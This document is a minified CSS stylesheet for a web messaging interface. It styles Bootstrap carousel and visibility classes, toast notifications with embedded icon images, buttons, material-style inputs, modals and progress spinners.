.carousel-inner>.active{left:0}
.carousel-inner>.next,.carousel-inner>.prev{position:absolute;top:0;width:100%}
.carousel-inner>.next{left:100%}
.carousel-inner>.prev{left:-100%}
.carousel-inner>.next.left,.carousel-inner>.prev.right{left:0}
.carousel-inner>.active.left{left:-100%}
.carousel-inner>.active.right{left:100%}
.carousel-control{position:absolute;top:0;left:0;bottom:0;width:15%;opacity:.5;filter:alpha(opacity=50);font-size:20px;color:#fff;text-align:center;text-shadow:0 1px 2px rgba(0,0,0,.6)}
.carousel-control.left{background-image:-webkit-linear-gradient(left,rgba(0,0,0,.5) 0,rgba(0,0,0,.0001) 100%);background-image:-o-linear-gradient(left,rgba(0,0,0,.5) 0,rgba(0,0,0,.0001) 100%);background-image:linear-gradient(to right,rgba(0,0,0,.5) 0,rgba(0,0,0,.0001) 100%);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#80000000', endColorstr='#00000000', GradientType=1)}
.carousel-control.right{left:auto;right:0;background-image:-webkit-linear-gradient(left,rgba(0,0,0,.0001) 0,rgba(0,0,0,.5) 100%);background-image:-o-linear-gradient(left,rgba(0,0,0,.0001) 0,rgba(0,0,0,.5) 100%);background-image:linear-gradient(to right,rgba(0,0,0,.0001) 0,rgba(0,0,0,.5) 100%);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#00000000', endColorstr='#80000000', GradientType=1)}
.carousel-control:focus,.carousel-control:hover{outline:0;color:#fff;text-decoration:none;opacity:.9;filter:alpha(opacity=90)}
.carousel-control .glyphicon-chevron-left,.carousel-control .glyphicon-chevron-right,.carousel-control .icon-next,.carousel-control .icon-prev{position:absolute;top:50%;z-index:5;display:inline-block}
.carousel-control .glyphicon-chevron-left,.carousel-control .icon-prev{left:50%;margin-left:-10px}
.carousel-control .glyphicon-chevron-right,.carousel-control .icon-next{right:50%;margin-right:-10px}
.carousel-control .icon-next,.carousel-control .icon-prev{width:20px;height:20px;margin-top:-10px;font-family:serif}
.carousel-control .icon-prev:before{content:'\2039'}
.carousel-control .icon-next:before{content:'\203a'}
.carousel-indicators{position:absolute;bottom:10px;left:50%;z-index:15;width:60%;margin-left:-30%;padding-left:0;list-style:none;text-align:center}
.carousel-indicators li{display:inline-block;width:10px;height:10px;margin:1px;text-indent:-999px;border:1px solid #fff;border-radius:10px;cursor:pointer;background-color:transparent}
.carousel-indicators .active{margin:0;width:12px;height:12px;background-color:#fff}
.carousel-caption{position:absolute;left:15%;right:15%;bottom:20px;z-index:10;padding-top:20px;padding-bottom:20px;color:#fff;text-align:center;text-shadow:0 1px 2px rgba(0,0,0,.6)}
.carousel-caption .btn{text-shadow:none}
@media screen and (min-width:768px){.carousel-control .glyphicon-chevron-left,.carousel-control .glyphicon-chevron-right,.carousel-control .icon-next,.carousel-control .icon-prev{width:30px;height:30px;margin-top:-15px;font-size:30px}
.carousel-control .glyphicon-chevron-left,.carousel-control .icon-prev{margin-left:-15px}
.carousel-control .glyphicon-chevron-right,.carousel-control .icon-next{margin-right:-15px}
.carousel-caption{left:20%;right:20%;padding-bottom:30px}
.carousel-indicators{bottom:20px}}
.btn-group-vertical>.btn-group:after,.btn-group-vertical>.btn-group:before,.btn-toolbar:after,.btn-toolbar:before,.clearfix:after,.clearfix:before,.container-fluid:after,.container-fluid:before,.container:after,.container:before,.dl-horizontal dd:after,.dl-horizontal dd:before,.form-horizontal .form-group:after,.form-horizontal .form-group:before,.modal-footer:after,.modal-footer:before,.nav:after,.nav:before,.navbar-collapse:after,.navbar-collapse:before,.navbar-header:after,.navbar-header:before,.navbar:after,.navbar:before,.pager:after,.pager:before,.panel-body:after,.panel-body:before,.row:after,.row:before{content:" ";display:table}
.btn-group-vertical>.btn-group:after,.btn-toolbar:after,.clearfix:after,.container-fluid:after,.container:after,.dl-horizontal dd:after,.form-horizontal .form-group:after,.modal-footer:after,.nav:after,.navbar-collapse:after,.navbar-header:after,.navbar:after,.pager:after,.panel-body:after,.row:after{clear:both}
.center-block{display:block;margin-left:auto;margin-right:auto}
.pull-right{float:right!important}
.pull-left{float:left!important}
.hide{display:none!important}
.show{display:block!important}
.invisible{visibility:hidden}
.text-hide{font:0/0 a;color:transparent;text-shadow:none;background-color:transparent;border:0}
.hidden{display:none!important;visibility:hidden!important}
.affix{position:fixed;-webkit-transform:translate3d(0,0,0);transform:translate3d(0,0,0)}
@-ms-viewport{width:device-width}
.visible-lg,.visible-lg-block,.visible-lg-inline,.visible-lg-inline-block,.visible-md,.visible-md-block,.visible-md-inline,.visible-md-inline-block,.visible-print,.visible-print-block,.visible-print-inline,.visible-print-inline-block,.visible-sm,.visible-sm-block,.visible-sm-inline,.visible-sm-inline-block,.visible-xs,.visible-xs-block,.visible-xs-inline,.visible-xs-inline-block{display:none!important}
@media (max-width:767px){.visible-xs{display:block!important}
table.visible-xs{display:table}
tr.visible-xs{display:table-row!important}
td.visible-xs,th.visible-xs{display:table-cell!important}}
@media (max-width:767px){.visible-xs-block{display:block!important}}
@media (max-width:767px){.visible-xs-inline{display:inline!important}}
@media (max-width:767px){.visible-xs-inline-block{display:inline-block!important}}
@media (min-width:768px) and (max-width:991px){.visible-sm{display:block!important}
table.visible-sm{display:table}
tr.visible-sm{display:table-row!important}
td.visible-sm,th.visible-sm{display:table-cell!important}}
@media (min-width:768px) and (max-width:991px){.visible-sm-block{display:block!important}}
@media (min-width:768px) and (max-width:991px){.visible-sm-inline{display:inline!important}}
@media (min-width:768px) and (max-width:991px){.visible-sm-inline-block{display:inline-block!important}}
@media (min-width:992px) and (max-width:1199px){.visible-md{display:block!important}
table.visible-md{display:table}
tr.visible-md{display:table-row!important}
td.visible-md,th.visible-md{display:table-cell!important}}
@media (min-width:992px) and (max-width:1199px){.visible-md-block{display:block!important}}
@media (min-width:992px) and (max-width:1199px){.visible-md-inline{display:inline!important}}
@media (min-width:992px) and (max-width:1199px){.visible-md-inline-block{display:inline-block!important}}
@media (min-width:1200px){.visible-lg{display:block!important}
table.visible-lg{display:table}
tr.visible-lg{display:table-row!important}
td.visible-lg,th.visible-lg{display:table-cell!important}}
@media (min-width:1200px){.visible-lg-block{display:block!important}}
@media (min-width:1200px){.visible-lg-inline{display:inline!important}}
@media (min-width:1200px){.visible-lg-inline-block{display:inline-block!important}}
@media (max-width:767px){.hidden-xs{display:none!important}}
@media (min-width:768px) and (max-width:991px){.hidden-sm{display:none!important}}
@media (min-width:992px) and (max-width:1199px){.hidden-md{display:none!important}}
@media (min-width:1200px){.hidden-lg{display:none!important}}
@media print{.visible-print{display:block!important}
table.visible-print{display:table}
tr.visible-print{display:table-row!important}
td.visible-print,th.visible-print{display:table-cell!important}}
@media print{.visible-print-block{display:block!important}}
@media print{.visible-print-inline{display:inline!important}}
@media print{.visible-print-inline-block{display:inline-block!important}}
@media print{.hidden-print{display:none!important}}
.toast-title{font-weight:700}
.toast-message{-ms-word-wrap:break-word;word-wrap:break-word}
.toast-message a,.toast-message label{color:#fff}
.toast-message a:hover{color:#ccc;text-decoration:none}
.toast-close-button{position:relative;right:-.3em;top:-.3em;float:right;font-size:20px;font-weight:700;color:#fff;-webkit-text-shadow:0 1px 0 #fff;text-shadow:0 1px 0 #fff;opacity:.8;-ms-filter:progid:DXImageTransform.Microsoft.Alpha(Opacity=80);filter:alpha(opacity=80)}
.toast-close-button:focus,.toast-close-button:hover{color:#000;text-decoration:none;cursor:pointer;opacity:.4;-ms-filter:progid:DXImageTransform.Microsoft.Alpha(Opacity=40);filter:alpha(opacity=40)}
button.toast-close-button{padding:0;cursor:pointer;background:0 0;border:0;-webkit-appearance:none}
.toast-top-full-width{top:0;right:0;width:100%}
.toast-bottom-full-width{bottom:0;right:0;width:100%}
.toast-top-left{top:12px;left:12px}
.toast-top-center{top:12px}
.toast-top-right{top:12px;right:12px}
.toast-bottom-right{right:12px;bottom:12px}
.toast-bottom-center{bottom:12px}
.toast-bottom-left{bottom:12px;left:12px}
.toast-center{top:45%}
#toast-container{position:fixed;z-index:999999;pointer-events:auto}
#toast-container.toast-bottom-center,#toast-container.toast-center,#toast-container.toast-top-center{width:100%;pointer-events:none}
#toast-container.toast-bottom-center>div,#toast-container.toast-center>div,#toast-container.toast-top-center>div{margin-left:auto;margin-right:auto;pointer-events:auto}
#toast-container.toast-bottom-center>button,#toast-container.toast-center>button,#toast-container.toast-top-center>button{pointer-events:auto}
#toast-container *{-moz-box-sizing:border-box;-webkit-box-sizing:border-box;box-sizing:border-box}
#toast-container>div{margin:0 0 6px;padding:15px 15px 15px 50px;width:300px;-moz-border-radius:3px;-webkit-border-radius:3px;border-radius:3px;background-position:15px center;background-repeat:no-repeat;-moz-box-shadow:0 0 12px #999;-webkit-box-shadow:0 0 12px #999;box-shadow:0 0 12px #999;color:#fff;opacity:.8;-ms-filter:progid:DXImageTransform.Microsoft.Alpha(Opacity=80);filter:alpha(opacity=80)}
#toast-container>:hover{-moz-box-shadow:0 0 12px #000;-webkit-box-shadow:0 0 12px #000;box-shadow:0 0 12px #000;opacity:1;-ms-filter:progid:DXImageTransform.Microsoft.Alpha(Opacity=100);filter:alpha(opacity=100);cursor:pointer}
#toast-container>.toast-wait{background-image:url(data:image/gif;base64,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)!important}
#toast-container>.toast-error{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAHOSURBVEhLrZa/SgNBEMZzh0WKCClSCKaIYOED+AAKeQQLG8HWztLCImBrYadgIdY+gIKNYkBFSwu7CAoqCgkkoGBI/E28PdbLZmeDLgzZzcx83/zZ2SSXC1j9fr+I1Hq93g2yxH4iwM1vkoBWAdxCmpzTxfkN2RcyZNaHFIkSo10+8kgxkXIURV5HGxTmFuc75B2RfQkpxHG8aAgaAFa0tAHqYFfQ7Iwe2yhODk8+J4C7yAoRTWI3w/4klGRgR4lO7Rpn9+gvMyWp+uxFh8+H+ARlgN1nJuJuQAYvNkEnwGFck18Er4q3egEc/oO+mhLdKgRyhdNFiacC0rlOCbhNVz4H9FnAYgDBvU3QIioZlJFLJtsoHYRDfiZoUyIxqCtRpVlANq0EU4dApjrtgezPFad5S19Wgjkc0hNVnuF4HjVA6C7QrSIbylB+oZe3aHgBsqlNqKYH48jXyJKMuAbiyVJ8KzaB3eRc0pg9VwQ4niFryI68qiOi3AbjwdsfnAtk0bCjTLJKr6mrD9g8iq/S/B81hguOMlQTnVyG40wAcjnmgsCNESDrjme7wfftP4P7SP4N3CJZdvzoNyGq2c/HWOXJGsvVg+RA/k2MC/wN6I2YA2Pt8GkAAAAASUVORK5CYII=)!important}
#toast-container>.toast-success{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAADsSURBVEhLY2AYBfQMgf///3P8+/evAIgvA/FsIF+BavYDDWMBGroaSMMBiE8VC7AZDrIFaMFnii3AZTjUgsUUWUDA8OdAH6iQbQEhw4HyGsPEcKBXBIC4ARhex4G4BsjmweU1soIFaGg/WtoFZRIZdEvIMhxkCCjXIVsATV6gFGACs4Rsw0EGgIIH3QJYJgHSARQZDrWAB+jawzgs+Q2UO49D7jnRSRGoEFRILcdmEMWGI0cm0JJ2QpYA1RDvcmzJEWhABhD/pqrL0S0CWuABKgnRki9lLseS7g2AlqwHWQSKH4oKLrILpRGhEQCw2LiRUIa4lwAAAABJRU5ErkJggg==)!important}
#toast-container>.toast-warning{background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAGYSURBVEhL5ZSvTsNQFMbXZGICMYGYmJhAQIJAICYQPAACiSDB8AiICQQJT4CqQEwgJvYASAQCiZiYmJhAIBATCARJy+9rTsldd8sKu1M0+dLb057v6/lbq/2rK0mS/TRNj9cWNAKPYIJII7gIxCcQ51cvqID+GIEX8ASG4B1bK5gIZFeQfoJdEXOfgX4QAQg7kH2A65yQ87lyxb27sggkAzAuFhbbg1K2kgCkB1bVwyIR9m2L7PRPIhDUIXgGtyKw575yz3lTNs6X4JXnjV+LKM/m3MydnTbtOKIjtz6VhCBq4vSm3ncdrD2lk0VgUXSVKjVDJXJzijW1RQdsU7F77He8u68koNZTz8Oz5yGa6J3H3lZ0xYgXBK2QymlWWA+RWnYhskLBv2vmE+hBMCtbA7KX5drWyRT/2JsqZ2IvfB9Y4bWDNMFbJRFmC9E74SoS0CqulwjkC0+5bpcV1CZ8NMej4pjy0U+doDQsGyo1hzVJttIjhQ7GnBtRFN1UarUlH8F3xict+HY07rEzoUGPlWcjRFRr4/gChZgc3ZL2d8oAAAAASUVORK5CYII=)!important}
#toast-container.toast-bottom-full-width>div,#toast-container.toast-top-full-width>div{width:96%;margin:auto}
.toast{background-color:#030303}
.toast-success{background-color:#51a351}
.toast-error{background-color:#bd362f}
.toast-info,.toast-wait{background-color:#2f96b4}
.toast-warning{background-color:#f89406}
#toast-container>.toast-info{background-color:#404040;border-radius:3px;box-shadow:0 0 2px rgba(0,0,0,.12),0 2px 4px rgba(0,0,0,.24);color:#fff;line-height:20px;padding:16px;font-size:13px;text-align:center}
@media all and (max-width:240px){#toast-container>div{padding:8px 8px 8px 50px;width:11em}
#toast-container .toast-close-button{right:-.2em;top:-.2em}}
@media all and (min-width:241px) and (max-width:480px){#toast-container>div{padding:8px 8px 8px 50px;width:18em}
#toast-container .toast-close-button{right:-.2em;top:-.2em}}
@media all and (min-width:481px) and (max-width:768px){#toast-container>div{padding:15px 15px 15px 50px;width:25em}}
:not(.no-enter)#toast-container>div.ng-enter,:not(.no-leave)#toast-container>div.ng-leave{-webkit-transition:200ms cubic-bezier(.25,.25,.75,.75) all;-moz-transition:200ms cubic-bezier(.25,.25,.75,.75) all;-ms-transition:200ms cubic-bezier(.25,.25,.75,.75) all;-o-transition:200ms cubic-bezier(.25,.25,.75,.75) all;transition:200ms cubic-bezier(.25,.25,.75,.75) all}
:not(.no-enter)#toast-container>div.ng-enter.ng-enter-active,:not(.no-leave)#toast-container>div.ng-leave{opacity:.8}
:not(.no-enter)#toast-container>div.ng-enter,:not(.no-leave)#toast-container>div.ng-leave.ng-leave-active{opacity:0}
html{background:#e7ebf0;overflow:visible}
body{color:#000;background:0 0;font:12px/18px 'Open Sans',"Lucida Grande","Lucida Sans Unicode",Arial,Helvetica,Verdana,sans-serif;overflow:hidden}
body.non_osx{font:13px/18px Tahoma,sans-serif,Arial,Helvetica}
h1,h2,h3,h4,h5{color:#222}
.non_osx h4{font-size:17px}
.noselect{-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
.hasselect{-webkit-user-select:text;-moz-user-select:text;-ms-user-select:text;user-select:text}
.copyonly{color:transparent;display:inline-block;vertical-align:baseline;width:1px;height:0;background:0 no-repeat none;font-size:0;float:left;text-rendering:auto;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
.nocopy::before{content:attr(data-content)}
pre{margin-bottom:0;overflow:auto;padding:3px;border:1px solid #eee;max-height:none;font-size:inherit}
a{cursor:pointer}
a.disabled{cursor:default;pointer-events:none}
.form-control{border:1px solid #d9dbde;border-radius:2px;-webkit-box-shadow:none;-moz-box-shadow:none;box-shadow:none;-webkit-transition:border-color ease-in-out .15s,box-shadow ease-in-out .15s;transition:border-color ease-in-out .15s,box-shadow ease-in-out .15s}
.form-control:focus{border-color:#66afe9;outline:0;-webkit-box-shadow:inset 0 1px 1px rgba(0,0,0,.075),0 0 8px rgba(102,175,233,.6);-moz-box-shadow:inset 0 1px 1px rgba(0,0,0,.075),0 0 8px rgba(102,175,233,.6);box-shadow:inset 0 1px 1px rgba(0,0,0,.075),0 0 8px rgba(102,175,233,.6)}
.form-control.no_outline:focus{border:1px solid #d9dbde;outline:0;-webkit-box-shadow:none;-moz-box-shadow:none;box-shadow:none}
.form-control:-ms-input-placeholder,.form-control::-moz-placeholder,.form-control::-webkit-input-placeholder{color:#b3b3b3}
input[type=number]{-moz-appearance:textfield}
input[type=number]::-webkit-inner-spin-button,input[type=number]::-webkit-outer-spin-button{-webkit-appearance:none;margin:0}
.btn{border:0;padding:7px 13px}
.btn.active,.btn.active:focus,.btn:active,.btn:active:focus,.btn:focus,.btn:hover,.open .btn.dropdown-toggle{-webkit-box-shadow:none;-moz-box-shadow:none;box-shadow:none;outline:0}
.btn-success{color:#fff;background-color:#6ec26d}
.btn-success.active,.btn-success:active,.btn-success:focus,.btn-success:hover,.open .btn-success.dropdown-toggle{color:#fff;background-color:#61b75b}
.btn-success.active,.btn-success:active,.open .btn-success.dropdown-toggle{background:#66b864}
.btn-danger{color:#fff;background-color:#c05f5a}
.btn-danger.active,.btn-danger:active,.btn-danger:focus,.btn-danger:hover,.open .btn-danger.dropdown-toggle{color:#fff;background-color:#ab5450}
.btn-danger.active,.btn-danger:active,.open .btn-danger.dropdown-toggle{background:#a24f4b}
.btn-primary{color:#fff;background-color:#6490b1;border-radius:3px}
.btn-primary.active,.btn-primary:active,.btn-primary:focus,.btn-primary:hover,.open .btn-primary.dropdown-toggle{color:#fff;background-color:#4a80a9}
.btn-primary.active,.btn-primary:active,.open .btn-primary.dropdown-toggle{background:#41769e}
.btn-primary.disabled,.btn-primary[disabled]{background:#7999b3}
.btn-link{color:#3a6d99;text-decoration:none!important;border-radius:3px;overflow:hidden}
.btn-link:hover{background:#f2f6fa}
.btn-link.btn-link-noarea:hover,.btn-link.dropdown-toggle:hover{background:0 0}
.btn-link.dropdown-toggle:active{outline:0}
.btn-md{background:0 0;text-decoration:none!important;border-radius:2px;overflow:hidden;text-transform:uppercase;font-size:13px;padding:6px 10px;font-weight:700}
.btn-md,.btn-md:focus,.btn-md:hover{color:#72a0c7}
.btn-md:hover{background:#f2f6fa}
.btn-md-primary,.btn-md-primary:focus,.btn-md-primary:hover{color:#4680b3}
.btn-md-danger,.btn-md-danger:focus,.btn-md-danger:hover{color:#c05f5a}
.btn-md-danger:hover{background:#fbe7e6}
.md-input-group{height:50px;border-bottom:1px solid #e6e6e6;padding:0;margin:0 0 22px}
.md-textarea-group{height:66px}
.md-input-grouped{margin-bottom:12px}
.md-input-label{font-weight:400;color:#999;cursor:pointer;display:block;font-size:13px;margin:0;padding:0;z-index:1;pointer-events:none;-webkit-font-smoothing:antialiased;transform-origin:left center;-webkit-transform-origin:left center;-webkit-transform:translate3d(0,22px,0);transform:translate3d(0,22px,0)}
.md-input-label span.ng-enter-prepare{display:none}
.md-input-animated .md-input-group,.md-input-animated .md-input-label{-webkit-transition:all .15s cubic-bezier(.35,0,.25,1);transition:all .15s cubic-bezier(.35,0,.25,1)}
.md-input{color:#000;background:#fff;display:inline-block;border:0;outline:0;font-size:13px;padding:3px 0;margin:3px 0 0;width:100%;resize:none;-webkit-box-shadow:none;-moz-box-shadow:none;box-shadow:none}
.md-input-disabled .md-input{color:#999}
.md-input-focused{border-bottom:2px solid #6bace1}
.md-input-error{border-bottom:2px solid #e2726f}
.md-input-error .md-input-label{color:#d45a58}
.md-input-has-value .md-input-label{-webkit-transform:scale(.9);transform:scale(.9)}
.md-input-group-centered,.md-input-group-centered .md-input{text-align:center}
.md-input-group-centered .md-input-label{transform-origin:center center;-webkit-transform-origin:center center}
.md_modal_head{color:#fff;background:#5580a3;padding:0 0 28px 26px}
.md_modal_head_simple{padding-bottom:13px}
.md_modal_actions_wrap{float:right}
a.md_modal_action{display:block;float:right;color:#dde8f1;padding:19px 15px 5px;font-weight:700}
a.md_modal_action:hover{color:#fff}
a.md_modal_action_close{padding-right:22px}
a.md_modal_action:active,a.md_modal_action:focus,a.md_modal_action:hover{text-decoration:none}
.md_modal_title{font-weight:700;padding:18px 0 5px;font-size:13px}
.navbar_offline .navbar-header,.navbar_offline .navbar-offline>li{float:left}
.navbar-offline{max-width:400px;margin:0 auto;float:none}
.navbar-offline-text{color:#b9cfe3;padding:13px 15px;font-size:13px;display:block;line-height:20px}
.tg_progress{height:12px;margin:0;padding:0;background:rgba(255,255,255,.4);border:5px solid rgba(0,0,0,.5);border-radius:3px}
.tg_progress .progress-bar{height:5px;line-height:2px;background:rgba(255,255,255,.9);border-radius:0;overflow:hidden}
.progress-arc-wrap{display:block;border-radius:100%;transform-origin:center center;-webkit-animation:infinite_rotation .8s linear infinite;-moz-animation:infinite_rotation .8s linear infinite;-ms-animation:infinite_rotation .8s linear infinite;animation:infinite_rotation .8s linear infinite}
.progress-arc .progress-arc-bar{stroke-dashoffset:0;transform-origin:center center;fill:transparent}
.progress-arc-intermediate .progress-arc .progress-arc-bar{stroke:#68a4d1}
.composer_progress_icon .progress-arc .progress-arc-bar{stroke:#b3b3b3}
.progress-arc-percent .progress-arc .progress-arc-bar{stroke:#FFF;stroke:rgba(255,255,255,.95);transition:stroke-dasharray 500ms linear}
.stop0{stop-opacity:1;stop-color:#68a4d1}
.composer_progress_icon .stop0{stop-color:#b3b3b3}
.stop60{stop-opacity:1;stop-color:#68a4d1}
.composer_progress_icon .stop60{stop-color:#b3b3b3}
.stop100{stop-opacity:0;stop-color:#68a4d1}
.composer_progress_icon .stop100{stop-color:#b3b3b3}
@-webkit-keyframes infinite_rotation{0%{transform:rotate(0)}
100%{transform:rotate(360deg)}}
@-moz-keyframes infinite_rotation{0%{transform:rotate(0)}
100%{transform:rotate(360deg)}}
@-ms-keyframes infinite_rotation{0%{transform:rotate(0)}
100%{transform:rotate(360deg)}}
@keyframes infinite_rotation{0%{transform:rotate(0)}
100%{transform:rotate(360deg)}}
.dropdown-menu{border-radius:2px;padding:0;-webkit-box-shadow:0 1px 3px rgba(0,0,0,.175);-moz-box-shadow:0 1px 3px rgba(0,0,0,.175);box-shadow:0 1px 3px rgba(0,0,0,.175)}
.dropdown-menu-to-up{top:auto;bottom:100%;margin:0 0 3px}
.dropdown-menu>li>a{padding:5px 14px;font-size:13px}
.modal-backdrop{background:rgba(26,26,26,.7);opacity:1!important}
.modal-backdrop.fade,.modal.fade,.modal.fade .modal-dialog{-webkit-transition:none;-moz-transition:none;-o-transition:none;transition:none}
.text-invisible{visibility:hidden}
.modal{overflow-y:auto;padding:10px}
